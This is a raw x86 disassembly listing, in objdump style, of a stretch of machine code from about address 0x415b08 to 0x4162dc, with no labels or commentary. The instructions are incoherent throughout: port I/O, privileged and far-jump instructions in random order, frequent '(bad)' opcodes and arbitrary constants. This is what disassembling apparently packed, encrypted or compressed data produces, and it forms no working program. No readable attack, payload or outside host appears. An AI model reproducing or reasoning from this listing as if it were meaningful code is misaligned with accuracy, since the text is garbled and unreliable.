  415b08:	lods   eax,DWORD PTR ds:[esi]
  415b09:	push   eax
  415b0a:	out    dx,eax
  415b0b:	dec    esi
  415b0c:	jno    0x415b18
  415b0e:	inc    eax
  415b0f:	add    eax,edi
  415b11:	jo     0x415ac0
  415b13:	or     dl,bh
  415b15:	cmp    cl,al
  415b17:	jbe    0x415b4b
  415b19:	cmc    
  415b1a:	stos   DWORD PTR es:[edi],eax
  415b1b:	bound  edx,QWORD PTR [esi-0x426504b4]
  415b21:	retf   0x3cd6
  415b24:	js     0x415ae6
  415b26:	mov    cl,0xf3
  415b28:	sub    BYTE PTR [ebx+0x65],dl
  415b2b:	sti    
  415b2c:	je     0x415b9f
  415b2e:	mov    ecx,0xc93e7dc2
  415b33:	repz into 
  415b35:	xchg   esp,eax
  415b36:	sbb    bh,ah
  415b38:	push   ecx
  415b39:	push   edi
  415b3a:	mov    ebx,0x7aa8554c
  415b3f:	iret   
  415b40:	iret   
  415b41:	sahf   
  415b42:	xchg   ecx,eax
  415b43:	jmp    0xe7c276ff
  415b48:	jno    0x415b43
  415b4a:	pop    edi
  415b4b:	in     eax,dx
  415b4c:	xchg   DWORD PTR [edx+ecx*1+0x12],eax
  415b50:	mov    esp,0x3766a7f7
  415b55:	stos   BYTE PTR es:[edi],al
  415b56:	cwde   
  415b57:	rcr    BYTE PTR [ebp-0x61],0x3e
  415b5b:	xchg   esp,eax
  415b5c:	retf   
  415b5d:	inc    ecx
  415b5e:	mov    dl,0x99
  415b60:	cmp    BYTE PTR [eax+0xd5fa467],ah
  415b66:	cmp    edx,DWORD PTR [eax+edx*8+0x65cca4e8]
  415b6d:	cdq    
  415b6e:	(bad)  
  415b6f:	xchg   ebx,eax
  415b70:	adc    eax,0xfaf828a2
  415b75:	pop    edx
  415b76:	sahf   
  415b77:	in     eax,dx
  415b78:	inc    eax
  415b79:	dec    esp
  415b7a:	add    eax,0xaf5f1bc
  415b7f:	jmp    0xe684:0xb32bfa2f
  415b86:	push   ebp
  415b87:	dec    edi
  415b88:	mov    esp,0xf47913cc
  415b8e:	jbe    0x415b87
  415b90:	int    0x31
  415b92:	cmp    BYTE PTR [esi],bh
  415b94:	out    dx,al
  415b95:	pop    eax
  415b96:	dec    ebx
  415b98:	je     0x415b70
  415b9a:	clc    
  415b9b:	lds    eax,FWORD PTR [ebx+edx*4+0x5]
  415b9f:	xchg   ecx,eax
  415ba0:	ret    0x5ab3
  415ba3:	mov    esi,0x6604c31c
  415ba8:	pop    ss
  415ba9:	and    al,0x6d
  415bab:	push   eax
  415bac:	ds jb  0x415b8b
  415baf:	mul    DWORD PTR [edx-0xa8a6453]
  415bb5:	sub    ebx,0x63
  415bb8:	jnp    0x415b9e
  415bba:	test   eax,0xc9113619
  415bbf:	pop    ebp
  415bc0:	fld    DWORD PTR [edx-0x54fcb964]
  415bc6:	add    DWORD PTR [edi-0xc],ecx
  415bc9:	jbe    0x415b60
  415bcb:	outs   dx,BYTE PTR ds:[esi]
  415bcc:	mov    ecx,DWORD PTR [edx-0x7b]
  415bcf:	sbb    ecx,DWORD PTR [edx-0x5e]
  415bd2:	mov    bl,0x32
  415bd4:	xor    ebp,ecx
  415bd6:	std    
  415bd7:	mov    al,ds:0xa2214f87
  415bdc:	js     0x415c08
  415bde:	mov    ebp,0x812b8f6f
  415be3:	mov    ch,0x53
  415be5:	pop    esp
  415be6:	ds pop es
  415be8:	adc    edx,DWORD PTR [edx-0x6b]
  415beb:	jno    0x415c1f
  415bed:	div    al
  415bef:	pop    ebx
  415bf0:	xor    al,0x8a
  415bf2:	jmp    0xf4c2:0xd4cc96c9
  415bf9:	push   cs
  415bfa:	mov    DWORD PTR [edi],esi
  415bfc:	aas    
  415bfd:	add    eax,0x364139b
  415c02:	leave  
  415c03:	cld    
  415c04:	or     al,0x28
  415c06:	out    0x2a,eax
  415c08:	and    edx,edx
  415c0a:	xchg   edx,eax
  415c0b:	js     0x415c5b
  415c0d:	in     eax,0xc7
  415c0f:	iret   
  415c10:	inc    edx
  415c11:	mov    ds:0xa14c7d7a,eax
  415c16:	jbe    0x415c16
  415c18:	sbb    al,0x3e
  415c1a:	ins    BYTE PTR es:[edi],dx
  415c1b:	push   ss
  415c1c:	add    eax,0x47a0711e
  415c21:	cmp    al,BYTE PTR [esi+esi*4-0x10a665f8]
  415c28:	jmp    0xa0d40f80
  415c2d:	dec    edx
  415c2e:	fistp  WORD PTR [ecx+0x74]
  415c31:	xor    BYTE PTR [esi-0x2ab44187],dh
  415c37:	cmp    BYTE PTR [edi+0x27],0xc0
  415c3b:	adc    al,0x57
  415c3d:	cli    
  415c3e:	push   0xffffffb4
  415c40:	ss push es
  415c42:	fsub   QWORD PTR [edx]
  415c44:	jbe    0x415bef
  415c46:	xlat   BYTE PTR ds:[ebx]
  415c47:	(bad)  
  415c48:	mov    eax,ds:0xfbed32e4
  415c4d:	cwde   
  415c4e:	and    al,BYTE PTR [ecx-0x7c]
  415c51:	(bad)  [edi+0x6e]
  415c54:	outs   dx,DWORD PTR ds:[esi]
  415c55:	jle    0x415be3
  415c57:	imul   dh
  415c59:	inc    eax
  415c5a:	or     DWORD PTR [ecx-0x589c4c9e],edi
  415c60:	outs   dx,BYTE PTR ds:[esi]
  415c61:	aaa    
  415c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c63:	sti    
  415c64:	fild   DWORD PTR [ecx]
  415c66:	ret    0x677d
  415c69:	sub    dl,BYTE PTR [edx+0x3e042d6c]
  415c6f:	(bad)  
  415c70:	xor    eax,0x7835a04b
  415c75:	(bad)  
  415c76:	adc    eax,0xc9b99a84
  415c7b:	and    DWORD PTR [eax-0x4bea3eb5],edx
  415c81:	mov    esi,DWORD PTR [ebx-0x13]
  415c84:	xchg   BYTE PTR [edi-0x7d],dh
  415c87:	fnstenv [edi-0x36a80a8f]
  415c8d:	jne    0x415c8d
  415c8f:	xor    eax,0x35d5a094
  415c94:	addr16 jge 0x415c62
  415c97:	dec    ebp
  415c98:	cwde   
  415c99:	cmc    
  415c9a:	in     al,dx
  415c9b:	push   edi
  415c9c:	xor    eax,0x4eb2b3ba
  415ca1:	repz xor eax,0x7089394a
  415ca7:	fsubrp st(1),st
  415ca9:	xchg   DWORD PTR [eax-0x4],eax
  415cac:	shl    DWORD PTR [esi+0x26],0xe8
  415cb0:	daa    
  415cb1:	shr    BYTE PTR [esi+0x36a46ff],cl
  415cb7:	int    0xbd
  415cb9:	mov    ds:0x16382186,al
  415cbe:	fdiv   st(7),st
  415cc0:	sbb    BYTE PTR [esi],bh
  415cc2:	call   FWORD PTR [edi*4-0x3252d2f4]
  415cc9:	fidivr DWORD PTR [ebp-0x234d9dfe]
  415ccf:	mov    cl,0x7f
  415cd1:	test   BYTE PTR [edi-0x78a9dace],dh
  415cd7:	mov    bh,0x2d
  415cd9:	push   ecx
  415cda:	retf   0x3cfb
  415cdd:	loopne 0x415c9f
  415cdf:	xchg   ebp,eax
  415ce0:	and    eax,0xc432a08c
  415ce5:	out    dx,al
  415ce6:	sbb    al,0x54
  415ce8:	jg     0x415c91
  415cea:	shl    BYTE PTR [edx-0x6f],0x66
  415cee:	jle    0x415ccb
  415cf0:	pop    edi
  415cf1:	sbb    bl,BYTE PTR [eax+0x16821941]
  415cf7:	cwde   
  415cf8:	sti    
  415cf9:	or     al,BYTE PTR [ebx-0x79]
  415cfc:	push   ss
  415cfd:	cmc    
  415cfe:	out    0x3c,al
  415d00:	sub    ah,BYTE PTR [esi-0x77]
  415d03:	push   esp
  415d04:	pushf  
  415d05:	xchg   ebp,eax
  415d06:	aaa    
  415d07:	and    DWORD PTR [edx],esp
  415d09:	lods   al,BYTE PTR ds:[esi]
  415d0a:	shl    DWORD PTR [edx+0x741d84e8],0xa2
  415d11:	aas    
  415d12:	scas   al,BYTE PTR es:[edi]
  415d13:	push   ds
  415d14:	int3   
  415d15:	inc    ebp
  415d16:	push   eax
  415d17:	popa   
  415d18:	sar    DWORD PTR ds:0xe93b6a33,0xf
  415d1f:	mov    dh,0x28
  415d21:	jp     0x415d57
  415d23:	xor    ebx,DWORD PTR [ebx+0x60dc78ea]
  415d29:	jecxz  0x415d69
  415d2b:	ret    0xc2ae
  415d2e:	fsubrp st(4),st
  415d30:	inc    esi
  415d31:	dec    ebp
  415d32:	daa    
  415d33:	cwde   
  415d34:	call   0xbe38:0xcb793ec6
  415d3b:	pop    edx
  415d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d3d:	push   es
  415d3e:	ja     0x415d01
  415d40:	mov    esp,0xd7ff742a
  415d45:	es icebp 
  415d47:	inc    eax
  415d48:	in     al,dx
  415d49:	sub    bl,ah
  415d4b:	pop    ss
  415d4c:	xor    BYTE PTR [esi+ebp*8-0x1e],dh
  415d50:	mov    al,0x35
  415d52:	pop    esi
  415d53:	jmp    0xef4348da
  415d58:	jle    0x415d40
  415d5a:	sbb    DWORD PTR [edi-0x34a3b87d],esi
  415d60:	pop    edi
  415d61:	jb     0x415d79
  415d63:	pop    ds
  415d64:	mov    ch,0x46
  415d66:	adc    al,0x4b
  415d68:	fadd   QWORD PTR [ebp-0x69]
  415d6b:	push   ebp
  415d6c:	leave  
  415d6d:	cmp    edx,DWORD PTR [esi-0x1ed42cd6]
  415d73:	cmc    
  415d74:	add    eax,0x44c90659
  415d79:	ins    DWORD PTR es:[edi],dx
  415d7a:	imul   eax,edx,0xffffffd4
  415d7d:	and    bh,BYTE PTR [edx]
  415d7f:	lahf   
  415d80:	loope  0x415dfa
  415d82:	int3   
  415d83:	dec    ebx
  415d84:	(bad)  
  415d85:	xchg   esi,eax
  415d86:	in     al,0xd6
  415d88:	nop
  415d89:	inc    edx
  415d8a:	sub    DWORD PTR [di+0x6973],ecx
  415d8f:	mov    edi,0xab12c8f6
  415d94:	sub    al,0x1b
  415d96:	ror    BYTE PTR [esi+0x40d4c7be],1
  415d9c:	xchg   esp,eax
  415d9d:	je     0x415d2f
  415d9f:	xor    al,0x3
  415da1:	(bad)  
  415da2:	xchg   ecx,eax
  415da3:	add    al,0xc2
  415da5:	dec    ecx
  415da6:	fadd   DWORD PTR [esi]
  415da8:	xor    al,0x6
  415daa:	imul   edx,DWORD PTR [edi+0x57027b24],0x842a6a8c
  415db4:	(bad)  
  415db5:	jmp    0x415dc5
  415db7:	sub    BYTE PTR es:[eax-0x5945cefe],ah
  415dbe:	inc    ecx
  415dbf:	fbstp  TBYTE PTR [edi+0x2a]
  415dc2:	pusha  
  415dc3:	mov    al,0xfb
  415dc5:	data16 aam 0x98
  415dc8:	mov    cl,ah
  415dca:	jmp    0x4ec8:0x736d56f4
  415dd1:	lods   eax,DWORD PTR ds:[esi]
  415dd2:	lods   al,BYTE PTR ds:[esi]
  415dd3:	mov    edx,0x2bc9c9f2
  415dd8:	and    al,0xaa
  415dda:	xchg   esi,eax
  415ddb:	outs   dx,BYTE PTR ds:[esi]
  415ddc:	jne    0x415ddc
  415dde:	ja     0x415dd8
  415de0:	(bad)  
  415de1:	pusha  
  415de2:	mov    BYTE PTR [ebp+0x63],cl
  415de5:	mov    edi,0x2d360978
  415dea:	dec    edi
  415deb:	test   al,0x6d
  415ded:	call   0x169a:0x6219d4f7
  415df4:	fcmovne st,st(3)
  415df6:	sbb    dl,BYTE PTR [ecx+0x1a]
  415df9:	pop    es
  415dfa:	mov    eax,0xb9b797bb
  415dff:	js     0x415e58
  415e01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e02:	pop    cx
  415e04:	jbe    0x415df1
  415e06:	inc    esp
  415e07:	and    cl,ch
  415e09:	(bad)  
  415e0a:	and    eax,0x87067006
  415e0f:	nop
  415e10:	xor    esp,ebx
  415e12:	or     BYTE PTR [ebx+0x62],cl
  415e15:	in     eax,0xed
  415e17:	(bad)  
  415e18:	int3   
  415e19:	adc    al,0xc7
  415e1b:	lods   al,BYTE PTR ds:[esi]
  415e1c:	mov    esi,0xa13f3066
  415e21:	stc    
  415e22:	loop   0x415e5d
  415e24:	xchg   BYTE PTR [eax+0x7b4b820c],bl
  415e2a:	mov    esp,0x81aa639c
  415e2f:	pop    es
  415e30:	mov    DWORD PTR [edi+eax*8],ebp
  415e33:	add    al,0x23
  415e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e36:	pop    DWORD PTR [esi+0x49]
  415e39:	xchg   BYTE PTR [edx-0x33352d70],bh
  415e3f:	mov    BYTE PTR [eax+0x6e],bh
  415e42:	push   0x77
  415e44:	lock and edi,DWORD PTR [edi-0x41]
  415e48:	hlt    
  415e49:	xchg   BYTE PTR [ebx+0x32529fec],dl
  415e4f:	push   cs
  415e50:	mov    al,0x20
  415e52:	in     eax,dx
  415e53:	ror    BYTE PTR [esi],cl
  415e55:	in     al,0xd3
  415e57:	and    eax,0x69755f35
  415e5c:	pushf  
  415e5d:	mov    ecx,0xef07bf84
  415e62:	mov    al,ds:0x6837c40e
  415e67:	call   0xe74c921e
  415e6c:	sbb    esi,DWORD PTR [eax+edi*4]
  415e6f:	ss mov cl,0x4
  415e72:	adc    al,bh
  415e74:	push   0x780fc4b5
  415e79:	cmp    cl,cl
  415e7b:	pusha  
  415e7c:	dec    ebx
  415e7d:	data16 mov WORD PTR [eax-0x36],cs
  415e81:	push   ebp
  415e82:	pop    edi
  415e83:	xor    al,0x72
  415e85:	lahf   
  415e86:	in     al,0xc0
  415e88:	lods   al,BYTE PTR ds:[esi]
  415e89:	ja     0x415ea4
  415e8b:	add    al,0x8b
  415e8d:	pushf  
  415e8e:	psadbw mm1,QWORD PTR [edi-0x26]
  415e92:	cmp    ah,BYTE PTR [esi+0x43a86686]
  415e98:	clc    
  415e99:	mov    cl,0x7d
  415e9b:	jg     0x415e42
  415e9d:	xor    dh,BYTE PTR [ecx]
  415e9f:	inc    ebx
  415ea0:	mov    edi,0xf0076b0e
  415ea5:	push   ebx
  415ea6:	lods   eax,DWORD PTR ds:[esi]
  415ea7:	aas    
  415ea8:	xlat   BYTE PTR ds:[ebx]
  415ea9:	push   eax
  415eaa:	push   edx
  415eab:	mov    bh,0x1f
  415ead:	mov    eax,ds:0xc92c8870
  415eb2:	call   0xaef7:0xaa989fe8
  415eb9:	and    al,0x14
  415ebb:	pop    ss
  415ebc:	adc    bl,BYTE PTR [ecx+edx*1+0x6ed60723]
  415ec3:	daa    
  415ec4:	jp     0x415ee3
  415ec6:	dec    esp
  415ec7:	leave  
  415ec8:	clc    
  415ec9:	pop    ecx
  415eca:	or     DWORD PTR [edi],eax
  415ecc:	adc    ah,BYTE PTR [eax-0x3c0d0a19]
  415ed2:	add    esp,DWORD PTR ss:0x117041c1
  415ed9:	add    eax,0x81509de6
  415ede:	mov    esp,0x1496cfb2
  415ee3:	and    BYTE PTR [eax],ch
  415ee5:	sub    edi,edx
  415ee7:	not    DWORD PTR [ecx-0x16]
  415eea:	(bad)  
  415eeb:	fcmovbe st,st(5)
  415eed:	mov    ds:0xfe628eec,al
  415ef2:	ffreep st(7)
  415ef4:	jnp    0x415f09
  415ef6:	xchg   esi,eax
  415ef7:	add    DWORD PTR [ecx-0x72b48a3],eax
  415efd:	out    0xe8,eax
  415eff:	inc    ebp
  415f00:	sub    al,0xdd
  415f02:	xchg   ebx,eax
  415f03:	stos   BYTE PTR es:[edi],al
  415f04:	sbb    al,0x79
  415f06:	pop    esi
  415f07:	mov    ebp,0x668c9326
  415f0c:	sub    eax,0x21121f3a
  415f11:	cmp    al,0x24
  415f13:	push   ecx
  415f14:	mov    cl,0x9
  415f16:	xor    ah,BYTE PTR [eax-0x4426cad1]
  415f1c:	dec    esp
  415f1d:	leave  
  415f1e:	jge    0x415f0d
  415f20:	pop    ecx
  415f21:	mov    cl,0x32
  415f23:	inc    edx
  415f24:	push   edx
  415f25:	jle    0x415f98
  415f27:	xor    eax,esi
  415f29:	popf   
  415f2a:	xor    edx,esi
  415f2c:	test   DWORD PTR [edi+0x76c3793f],esp
  415f32:	in     al,dx
  415f33:	pop    es
  415f34:	mov    cl,BYTE PTR [eax]
  415f36:	je     0x415f4e
  415f38:	aad    0x9b
  415f3a:	cmp    al,BYTE PTR ds:0x83602dd7
  415f40:	mov    ds:0xccb328d,al
  415f45:	lods   eax,DWORD PTR ds:[esi]
  415f46:	pop    ss
  415f47:	push   esp
  415f48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f49:	push   esp
  415f4a:	jmp    0x415f8a
  415f4c:	sub    dh,ah
  415f4e:	or     BYTE PTR [ebp+0x68],bh
  415f51:	or     BYTE PTR [ebx+0x347620d0],dh
  415f57:	mov    ds:0x672780bb,al
  415f5c:	(bad)  
  415f5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f5e:	add    ecx,DWORD PTR [ebx-0x7955d0e3]
  415f64:	daa    
  415f65:	pop    es
  415f66:	addr16 sub al,0xb4
  415f69:	mov    al,0x53
  415f6b:	popa   
  415f6c:	adc    al,0xfd
  415f6e:	retf   0xe8a3
  415f71:	repz ret 0xcf9c
  415f75:	pushf  
  415f76:	add    ch,BYTE PTR [esi-0xdd82559]
  415f7c:	jp     0x415fca
  415f7e:	in     al,dx
  415f7f:	(bad)  
  415f80:	ror    BYTE PTR [eax],0xdd
  415f83:	aam    0x26
  415f85:	or     bl,ah
  415f87:	lahf   
  415f88:	or     al,0x6
  415f8a:	push   edx
  415f8b:	outs   dx,DWORD PTR ds:[esi]
  415f8c:	mov    ch,0xd7
  415f8e:	lea    ebx,[ebx+0x5bd51ba6]
  415f94:	inc    edi
  415f95:	scas   eax,DWORD PTR es:[edi]
  415f96:	fdivr  DWORD PTR [edi-0x181690b6]
  415f9d:	lock jmp 0x415fdb
  415fa0:	add    DWORD PTR [ebp+0x7],0x4
  415fa4:	mov    BYTE PTR [ecx+edx*2+0x4ce752f3],bl
  415fab:	inc    ecx
  415fac:	pop    ecx
  415fad:	loope  0x415fa5
  415faf:	push   ebp
  415fb0:	stc    
  415fb1:	mov    al,ds:0x56c48bad
  415fb6:	mov    ds:0x69aca1d1,eax
  415fbb:	stos   BYTE PTR es:[edi],al
  415fbc:	das    
  415fbd:	mov    ecx,0x55dcda7f
  415fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fc3:	pop    edi
  415fc4:	popf   
  415fc5:	xor    BYTE PTR [esi+0x22],bl
  415fc8:	adc    DWORD PTR [eax-0x13],ebx
  415fcb:	mov    ch,0x36
  415fcd:	cwde   
  415fce:	(bad)  
  415fcf:	leave  
  415fd0:	inc    ebp
  415fd1:	mov    WORD PTR [ebx],gs
  415fd3:	xchg   ecx,eax
  415fd4:	sub    DWORD PTR [ecx],edx
  415fd6:	ss inc edi
  415fd8:	repz sbb al,0xb0
  415fdb:	xchg   esi,eax
  415fdc:	and    DWORD PTR ds:0xbafe401e,ebp
  415fe2:	sbb    ebx,DWORD PTR [edx]
  415fe4:	lahf   
  415fe5:	or     al,0x41
  415fe7:	sub    ebx,DWORD PTR [ebx+edi*2-0x28]
  415feb:	xchg   DWORD PTR [edi-0x39],ecx
  415fee:	dec    eax
  415fef:	sti    
  415ff0:	inc    esi
  415ff1:	jmp    0x6151:0x53218cf0
  415ff8:	call   0x409f:0xaff2f694
  415fff:	inc    ecx
  416000:	jb     0x415fb8
  416002:	lahf   
  416003:	aam    0x7c
  416005:	mov    eax,ds:0xd97d21c7
  41600a:	mov    ebp,0x457c32b9
  41600f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416010:	mov    edi,0xbaca2794
  416015:	jmp    0xf2cf9012
  41601a:	dec    eax
  41601b:	cmp    bl,BYTE PTR [edi-0x5b]
  41601e:	in     al,0x4c
  416020:	into   
  416021:	ss test eax,0x8bb6276a
  416027:	retf   
  416028:	mov    dl,cl
  41602a:	jnp    0x416090
  41602c:	lods   al,BYTE PTR ds:[esi]
  41602d:	loop   0x4160aa
  41602f:	mov    BYTE PTR [eax],ah
  416031:	fadd   QWORD PTR [eax-0x4ff71554]
  416037:	popf   
  416038:	rcr    eax,0x5a
  41603b:	in     eax,dx
  41603c:	shl    BYTE PTR [esi-0x65916769],0x8
  416043:	jae    0x41609f
  416045:	hlt    
  416046:	inc    edi
  416047:	mov    bl,0x18
  41604a:	mov    esi,DWORD PTR [ebp+eiz*4-0x54d538f2]
  416051:	inc    edi
  416052:	aad    0x4c
  416054:	adc    esp,DWORD PTR [ebp-0x2efc89e]
  41605a:	mov    ecx,0x3f5ae4c8
  41605f:	scas   al,BYTE PTR es:[edi]
  416060:	mov    BYTE PTR [edi+0x315c3459],cl
  416066:	popf   
  416067:	mov    dh,0xca
  41606a:	and    DWORD PTR [esi-0x1f],eax
  41606d:	bound  eax,QWORD PTR [eax]
  41606f:	sub    al,BYTE PTR [ebp+0x7e0f4954]
  416075:	mov    bh,0x6e
  416077:	call   0x1ef5:0x711b64ef
  41607e:	rcl    BYTE PTR [ecx],cl
  416080:	sbb    DWORD PTR ds:0x6eaccaf4,0x303cf2aa
  41608a:	sub    al,0xb7
  41608c:	clc    
  41608d:	push   esp
  41608e:	retf   
  41608f:	dec    ebp
  416090:	dec    esi
  416091:	imul   ecx,esp,0xffffff90
  416094:	(bad)  
  416095:	push   esp
  416096:	jbe    0x416079
  416098:	popf   
  416099:	pop    edi
  41609a:	sbb    ebx,esp
  41609c:	xchg   ebp,eax
  41609d:	push   ebx
  41609e:	dec    ax
  4160a0:	jl     0x41608d
  4160a2:	xchg   edi,eax
  4160a3:	jbe    0x41604c
  4160a5:	jbe    0x416060
  4160a7:	outs   dx,BYTE PTR ds:[esi]
  4160a8:	int3   
  4160a9:	xchg   edx,eax
  4160aa:	inc    eax
  4160ab:	sbb    ecx,ecx
  4160ad:	clc    
  4160ae:	add    edx,DWORD PTR [eax]
  4160b0:	lock xchg esi,eax
  4160b2:	fisub  DWORD PTR [ebx]
  4160b4:	jbe    0x4160ca
  4160b6:	xlat   BYTE PTR ds:[ebx]
  4160b7:	jmp    0xdfd9ea71
  4160bc:	jp     0x416053
  4160be:	test   eax,edi
  4160c0:	mov    ds:0xdabefa95,al
  4160c5:	lods   al,BYTE PTR ds:[esi]
  4160c6:	mov    DWORD PTR [edx+0x48],ecx
  4160c9:	jnp    0x41605a
  4160cb:	xor    ebx,DWORD PTR [edi+0x37d64159]
  4160d1:	test   BYTE PTR [edi-0x7e3891a6],dl
  4160d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160d8:	(bad)  
  4160d9:	iret   
  4160da:	dec    esi
  4160db:	cmp    edi,ebx
  4160dd:	and    DWORD PTR [edx+esi*8+0x363b29e2],eax
  4160e4:	aam    0x6b
  4160e6:	cmp    bh,BYTE PTR [edx]
  4160e8:	jno    0x4160ef
  4160ea:	sub    BYTE PTR [edi+ebx*1],ch
  4160ed:	rcr    BYTE PTR [ebx],1
  4160ef:	hlt    
  4160f0:	push   esi
  4160f1:	jnp    0x416137
  4160f3:	or     eax,0x39f9dbd1
  4160f8:	mov    esp,ds
  4160fa:	jae    0x4160c1
  4160fc:	push   eax
  4160fd:	sub    DWORD PTR ds:0x41139530,esp
  416103:	pop    ss
  416104:	ret    
  416105:	jl     0x416154
  416107:	xor    ah,dh
  416109:	loopne 0x416155
  41610b:	sub    eax,esp
  41610d:	std    
  41610e:	in     al,0xea
  416110:	ret    
  416111:	dec    esp
  416112:	retf   
  416113:	mov    bl,0x37
  416115:	or     al,ah
  416117:	and    BYTE PTR [edi+0x4b69ebec],dl
  41611d:	mov    ds:0x620133f5,al
  416122:	dec    esi
  416123:	or     BYTE PTR [edi],0x3f
  416126:	cli    
  416127:	mov    eax,0xc0e4ed5b
  41612c:	dec    ecx
  41612d:	xor    eax,0xad955cba
  416132:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  416134:	cmp    esp,eax
  416136:	and    ebp,DWORD PTR [ecx-0x57a5b472]
  41613c:	rol    BYTE PTR [ecx-0x15205781],1
  416142:	and    bh,BYTE PTR [ebp-0x77]
  416145:	adc    eax,edx
  416147:	inc    eax
  416148:	inc    esp
  416149:	in     eax,0x1e
  41614b:	adc    dl,bh
  41614d:	inc    eax
  41614e:	icebp  
  41614f:	and    BYTE PTR [eax-0x74b44b4b],ch
  416155:	loope  0x416138
  416157:	hlt    
  416158:	xchg   ebx,eax
  416159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41615a:	or     BYTE PTR [eax-0x64],ah
  41615d:	rcr    BYTE PTR [ecx+0x1d],0x4f
  416161:	fbstp  TBYTE PTR [ecx+0x5fc0cf18]
  416167:	pop    ebx
  416168:	or     BYTE PTR [ebx],dl
  41616a:	stos   DWORD PTR es:[edi],eax
  41616b:	rcl    DWORD PTR [eax-0x28e9e94a],0x56
  416172:	and    al,0x8c
  416174:	rcr    DWORD PTR [edx-0x4e17ec1e],0x97
  41617b:	mov    DWORD PTR [edi+0x2b1d34d7],ebx
  416181:	mov    dl,0xf8
  416183:	jae    0x4161ac
  416185:	lods   al,BYTE PTR ds:[esi]
  416186:	inc    DWORD PTR cs:[ebx+ecx*4+0x8]
  41618b:	cmp    BYTE PTR fs:0x353fe964,0xc0
  416193:	push   eax
  416194:	mov    al,0x5b
  416196:	sbb    al,0x74
  416198:	(bad)  
  416199:	sub    BYTE PTR [ebx+0x519e0ad1],ch
  41619f:	mov    eax,0x5de235c7
  4161a4:	sub    ch,BYTE PTR [edi+0x50]
  4161a7:	imul   ebx,DWORD PTR [ebx-0x250e3070],0xde441f5e
  4161b1:	mov    esi,0x168c5930
  4161b6:	mov    es,WORD PTR [ecx]
  4161b8:	sub    al,0x29
  4161ba:	(bad)  
  4161bb:	lea    edi,[ecx+0x39]
  4161be:	fnstenv [ebx+0x4baf5dfc]
  4161c4:	jl     0x41623b
  4161c6:	mov    ecx,0xa119c08d
  4161cb:	rcl    DWORD PTR [eax-0x222f9db3],0xa8
  4161d2:	in     al,0xf0
  4161d4:	add    BYTE PTR [esi-0x33],ch
  4161d7:	outs   dx,DWORD PTR ds:[esi]
  4161d8:	xor    eax,esi
  4161da:	jge    0x4161d8
  4161dc:	push   edx
  4161dd:	ret    
  4161de:	out    dx,al
  4161df:	out    0xc4,eax
  4161e1:	cmc    
  4161e2:	sub    BYTE PTR [edx],dh
  4161e4:	je     0x41624c
  4161e6:	shl    DWORD PTR [esi-0x7],1
  4161e9:	aas    
  4161ea:	adc    BYTE PTR [eax+edi*4-0x3e0d1ca4],dl
  4161f1:	adc    eax,0x942b5200
  4161f6:	and    ecx,DWORD PTR [edx+0x6014b726]
  4161fc:	dec    esp
  4161fd:	jp     0x4161b5
  4161ff:	mov    BYTE PTR [esi-0x7287c3f5],0x11
  416206:	(bad)  
  416208:	test   eax,0xb590e3ef
  41620d:	neg    esp
  41620f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416210:	cmp    BYTE PTR [eax-0x5d7b8bde],0x1d
  416217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416218:	xchg   WORD PTR [edx],ax
  41621b:	in     eax,0x15
  41621d:	add    DWORD PTR [edi-0x1adae7b2],edx
  416223:	jp     0x41622f
  416225:	xchg   ecx,eax
  416226:	push   ss
  416227:	sbb    ah,bh
  416229:	dec    ecx
  41622a:	(bad)  
  41622b:	xor    DWORD PTR [edx-0x62],esp
  41622e:	dec    DWORD PTR [eax-0x9e11bcd]
  416234:	push   esi
  416235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416236:	sbb    BYTE PTR [esi+ebx*1-0x38],ch
  41623a:	adc    al,dl
  41623c:	jb     0x416278
  41623e:	ins    DWORD PTR es:[edi],dx
  41623f:	out    0x90,al
  416241:	or     eax,0x4c1531b4
  416246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416247:	pusha  
  416248:	lahf   
  416249:	imul   ebp,DWORD PTR [ebp-0x51d2ca57],0x117698b7
  416253:	test   BYTE PTR [eax+eax*1],bh
  416256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416257:	push   0x393dbade
  41625c:	fsubr  DWORD PTR [esi-0x12fecdf0]
  416262:	inc    BYTE PTR [esi]
  416264:	push   esp
  416265:	call   0xf8fd8cef
  41626a:	jb     0x41626b
  41626c:	ret    
  41626d:	mov    ds:0x19436119,al
  416272:	dec    ecx
  416273:	mov    fs,WORD PTR [edi+0xd]
  416276:	dec    edi
  416277:	xor    eax,DWORD PTR [esi-0x15]
  41627a:	les    eax,FWORD PTR [ecx+0x1db43160]
  416280:	fcom   DWORD PTR [ebp+eax*1+0x46]
  416284:	or     al,0x70
  416286:	lahf   
  416287:	xor    BYTE PTR [eax+0x77200cb0],dh
  41628d:	rcr    DWORD PTR [edi+eax*4],0x6a
  416291:	xchg   edi,eax
  416292:	pop    ebx
  416293:	push   cs
  416294:	call   0xa6e8:0x6fe02418
  41629b:	dec    edi
  41629c:	(bad)  
  41629e:	into   
  41629f:	mov    al,ds:0xaec01e7c
  4162a4:	enter  0x7bbf,0x6f
  4162a8:	mov    ds:0x9ff071f8,eax
  4162ad:	pop    ebx
  4162ae:	push   0x31
  4162b0:	mov    ds:0x611303a9,al
  4162b5:	and    ah,cl
  4162b7:	ja     0x416257
  4162b9:	in     eax,0x9f
  4162bb:	xchg   esi,eax
  4162bc:	cmc    
  4162bd:	not    DWORD PTR [eax+0x9]
  4162c0:	jle    0x416327
  4162c2:	into   
  4162c3:	push   esi
  4162c4:	fadd   DWORD PTR [ebp+0x65]
  4162c7:	fnstenv [ebx]
  4162c9:	push   0x9ea305e3
  4162ce:	add    BYTE PTR ds:0x556871ea,dh
  4162d4:	fs dec edx
  4162d6:	sub    DWORD PTR [ecx-0x6cd37a39],esp
  4162dc:	test   eax,0x40ec0cdb
